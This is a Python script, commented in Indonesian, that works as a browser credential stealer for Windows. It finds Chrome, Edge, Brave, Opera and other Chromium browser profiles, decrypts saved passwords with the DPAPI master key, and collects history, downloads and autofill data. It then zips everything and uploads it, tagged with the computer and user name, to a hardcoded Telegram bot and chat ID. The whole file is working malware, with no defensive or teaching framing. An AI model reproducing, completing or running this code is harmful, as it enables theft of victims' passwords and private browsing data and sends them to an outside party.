import base64
import json
import os
import shutil
import sqlite3
import glob
import requests  # Library baru untuk Telegram
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData


TELEGRAM_BOT_TOKEN = '8278455404:AAHBXflVz681AHDE2APh8GyqQ2AdkxPD7tI--#' 
TELEGRAM_CHAT_ID = '1483692818'


# Coba import AES untuk dekripsi
try:
    from Crypto.Cipher import AES
except ImportError:
    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        print("Error: Library crypto tidak ditemukan. Install dengan: pip install pycryptodome")
        exit()

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

OUTPUT_PARENT_FOLDER = "Browser_Extracted_Data"

# PATHS UNTUK BERBAGAI BROWSER
browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    },
    'autofill': {
        'query': 'SELECT name, value, usage_count, date_created, date_last_used FROM autofill',
        'file': '\\Web Data',
        'columns': ['Name', 'Value', 'Usage Count', 'Date Created', 'Date Last Used'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    is_profile_path = any(prof in path for prof in ["Default", "Profile "])
    if is_profile_path:
        base_user_data_path = os.path.dirname(path)
        local_state_path = os.path.join(base_user_data_path, "Local State")
    else:
        local_state_path = os.path.join(path, "Local State")

    if not os.path.exists(local_state_path):
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8", errors='ignore') as f:
            c = f.read()
    except Exception:
        return None

    if 'os_crypt' not in c:
        return None

    try:
        local_state = json.loads(c)
        encrypted_key = local_state["os_crypt"]["encrypted_key"]
        if not encrypted_key:
            return None
        key = base64.b64decode(encrypted_key)
        if key[0:5] != b'DPAPI':
            return None
        key = key[5:]
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except Exception:
        return None

def decrypt_password(buff: bytes, key: bytes) -> str:
    if not key:
        return "No Key"
    
    if buff.startswith(b'v10'):
        iv = buff[3:15]
        payload = buff[15:]
    elif buff.startswith(b'\x01'):
        iv = buff[1:13]
        payload = buff[13:]
    else:
        return "Unknown Format"

    try:
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode('utf-8', errors='replace')
        return decrypted_pass
    except Exception as e:
        return f"Error: {e}"

def save_results(browser_name, profile_name, type_of_data, content):
    if not os.path.exists(OUTPUT_PARENT_FOLDER):
        os.mkdir(OUTPUT_PARENT_FOLDER)
    
    browser_output_folder = os.path.join(OUTPUT_PARENT_FOLDER, browser_name)
    if not os.path.exists(browser_output_folder):
        os.mkdir(browser_output_folder)

    profile_output_folder = os.path.join(browser_output_folder, profile_name)
    if not os.path.exists(profile_output_folder):
        os.mkdir(profile_output_folder)

    file_name = f"{type_of_data}.txt"
    file_path = os.path.join(profile_output_folder, file_name)

    if content and content.strip():
        try:
            with open(file_path, 'w', encoding="utf-8") as f:
                f.write(content)
        except Exception:
            pass

def get_data(db_file_path: str, key: bytes, type_of_data: dict) -> str:
    if not os.path.exists(db_file_path):
        return ""

    temp_db_path = 'temp_db_' + os.urandom(4).hex()
    conn = None
    result_content = ""

    try:
        shutil.copy(db_file_path, temp_db_path)
    except Exception:
        return ""

    try:
        conn = sqlite3.connect(temp_db_path)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])
        
        for row_tuple in cursor.fetchall():
            row = list(row_tuple)
            processed_row = []

            for i, item in enumerate(row):
                if type_of_data['decrypt'] and isinstance(item, bytes) and item:
                    if (type_of_data['columns'][i] == 'Password') and key:
                        processed_row.append(decrypt_password(item, key))
                    else:
                        processed_row.append(item.decode('utf-8', errors='replace'))
                elif isinstance(item, bytes):
                    processed_row.append(item.decode('utf-8', errors='replace'))
                else:
                    processed_row.append(str(item))

            result_content += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], processed_row)]) + "\n\n"

    except Exception:
        result_content = ""
    finally:
        if conn:
            conn.close()
        if os.path.exists(temp_db_path):
            try:
                os.remove(temp_db_path)
            except Exception:
                pass
    return result_content

def get_browser_profiles(browser_user_data_path: str) -> list:
    profiles = []
    default_profile_path = os.path.join(browser_user_data_path, "Default")
    if os.path.exists(default_profile_path):
        profiles.append("Default")

    profile_folders = glob.glob(os.path.join(browser_user_data_path, "Profile *"))
    for folder in profile_folders:
        profiles.append(os.path.basename(folder))
    
    if not profiles and os.path.isdir(browser_user_data_path):
        profiles.append("") 

    return profiles

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

# --- FUNGSI BARU UNTUK UPLOAD KE TELEGRAM ---
def zip_and_send_telegram():
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Error: Token atau Chat ID Telegram belum diisi.")
        return

    print("[-] Memproses kompresi data...")
    zip_filename = 'browser_data_report'
    
    try:
        # Membuat file zip dari folder OUTPUT_PARENT_FOLDER
        shutil.make_archive(zip_filename, 'zip', OUTPUT_PARENT_FOLDER)
        zip_file_path = zip_filename + '.zip'
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        caption_text = f"🔐 Laporan Data Browser\nPC: {os.getenv('COMPUTERNAME')}\nUser: {os.getenv('USERNAME')}\nWaktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        print(f"[-] Mengirim {zip_file_path} ke Telegram...")
        
        with open(zip_file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption_text}
            response = requests.post(url, files=files, data=data)
            
            if response.status_code == 200:
                print("[+] Upload Sukses! Cek Telegram kamu.")
            else:
                print(f"[!] Upload Gagal: {response.text}")
                
        # Bersihkan file zip setelah kirim (Opsional, hilangkan pagar jika ingin aktifkan)
        # os.remove(zip_file_path)
        
    except Exception as e:
        print(f"[!] Terjadi kesalahan saat upload: {e}")

# --- MAIN EXECUTION ---
if __name__ == '__main__':
    program_succeeded = False

    try:
        available_browsers = installed_browsers()

        if not available_browsers:
            print("Tidak ada browser yang didukung ditemukan.")
        else:
            for browser_name in available_browsers:
                browser_base_path = browsers[browser_name]
                profiles_to_check = get_browser_profiles(browser_base_path)

                if not profiles_to_check:
                    continue

                for profile_name in profiles_to_check:
                    current_profile_data_path = os.path.join(browser_base_path, profile_name) if profile_name else browser_base_path
                    master_key = get_master_key(current_profile_data_path)
                    
                    for data_type_name, data_type_info in data_queries.items():
                        db_file_name = data_type_info['file'].strip('\\')
                        db_file_path = os.path.join(current_profile_data_path, db_file_name)
                        
                        current_master_key_for_data = master_key if data_type_info['decrypt'] else None
                        data_content = get_data(db_file_path, current_master_key_for_data, data_type_info)
                        
                        save_results(browser_name, profile_name if profile_name else "root", data_type_name, data_content)
                        
                        if data_content:
                            program_succeeded = True

    except Exception as e:
        print(f"Error di main loop: {e}")

    # JIKA BERHASIL EKSTRAK, KIRIM KE TELEGRAM
    if program_succeeded:
        zip_and_send_telegram()
        print("Selesai.")
    else:
        print("Tidak ada data yang berhasil diekstrak atau terjadi error.")
